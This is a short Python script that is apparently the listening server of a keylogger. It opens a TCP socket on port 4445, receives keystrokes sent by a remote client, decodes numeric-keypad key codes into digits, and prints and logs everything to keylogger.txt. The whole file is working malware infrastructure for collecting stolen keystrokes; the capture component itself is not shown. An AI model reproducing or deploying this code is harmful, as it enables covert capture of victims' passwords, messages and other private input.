import socket,re,datetime,sys,os

socket = socket.socket()
port = 4445
socket.bind(('',int(port)))
socket.listen(1)
client, address = socket.accept()
print("{} connected".format(address))




file = open("keylogger.txt","a")
print("keyloger :")
dict = {"96":0,"97":1,"98":2,"99":3,"100":4,"101":5,"102":6,"103":7,"104":8,"105":9}

file.write("="*20+" Keylogger "+str(datetime.datetime.now())+"="*20)
if __name__=="__main__": 
	#checkOS()
	try:
		while True:
			file.write("\n")
			response = client.recv(65536).decode()
			rep = re.findall("<[0-9]+>",response)
			if len(rep) > 0:
				rep[0] = rep[0].replace('>','').replace('<','')
				if int(rep[0]) >= 96 and int(rep[0]) <= 105:
					print(str(dict[rep[0]])+" ("+response+")")
					file.write(str(dict[rep[0]]))
				else:
					print(response, end='')
					file.write(response)

			else:
				print(response, end='')
				file.write(response)

	except KeyboardInterrupt:
		print('Interrupted')
		try:
			file.close()
			client.close()
			socket.close()
			sys.exit(0)
		except SystemExit:
			os._exit(0)


file.close()
client.close()
socket.close()

